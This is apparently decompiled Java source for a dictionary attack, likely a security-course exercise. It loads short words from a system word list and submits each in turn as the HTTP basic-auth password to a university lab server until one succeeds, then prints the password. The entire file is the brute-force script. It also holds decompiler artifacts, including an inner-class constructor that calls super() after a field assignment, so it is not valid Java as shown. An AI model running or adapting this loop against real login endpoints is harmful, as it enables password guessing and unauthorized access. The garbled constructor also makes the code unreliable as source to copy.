public class Dictionary {
    boolean f00;
    int f10;
    java.util.Vector f20;
    Dictionary() {
        super();
        this.f00 = false;
        this.f20 = new java.util.Vector();
        this.f10 = 0;
        this.m10();
        this.m00();
    }
    public void m00() {
        while ( this.f10 < this.f20.size() ) {
            this.f00 = this.m20();
            if ( this.f00 ) {
                System.out.print ( "The password is: " );
                System.out.println ( ( String ) this.f20.elementAt ( this.f10 - 1 ) );
                this.f10 = this.f20.size();
            }
        }
    }
    public void m10() {
        try {
            java.io.BufferedReader a = new java.io.BufferedReader ( ( java.io.Reader ) new java.io.FileReader ( "/usr/share/lib/dict/words" ) );
            String s = a.readLine();
            while ( s != null ) {
                if ( s.length() <= 3 ) {
                    this.f20.addElement ( ( Object ) s );
                }
                s = a.readLine();
            }
        } catch ( java.io.IOException ignoredException ) {
        }
    }
    public boolean m20() {
        java.net.Authenticator.setDefault ( ( java.net.Authenticator ) new Dictionary$MyAuthenticator ( this ) );
        try {
            java.net.HttpURLConnection a = ( java.net.HttpURLConnection ) new java.net.URL ( "http://sec-crack.cs.rmit.edu./SEC/2/" ).openConnection();
            a.connect();
            if ( a.getResponseMessage().equalsIgnoreCase ( "OK" ) ) {
                return true;
            }
        } catch ( java.io.IOException ignoredException ) {
        }
        return false;
    }
    public static void main ( String[] a ) {
        Dictionary a0 = new Dictionary();
    }
}
class Dictionary$MyAuthenticator extends java.net.Authenticator {
    final Dictionary this$0;
    Dictionary$MyAuthenticator ( Dictionary a ) {
        this.this$0 = a;
        super();
    }
    protected java.net.PasswordAuthentication getPasswordAuthentication() {
        String s = ( String ) this.this$0.f20.elementAt ( this.this$0.f10 );
        this.this$0.f10 = this.this$0.f10 + 1;
        return new java.net.PasswordAuthentication ( "", s.toCharArray() );
    }
}
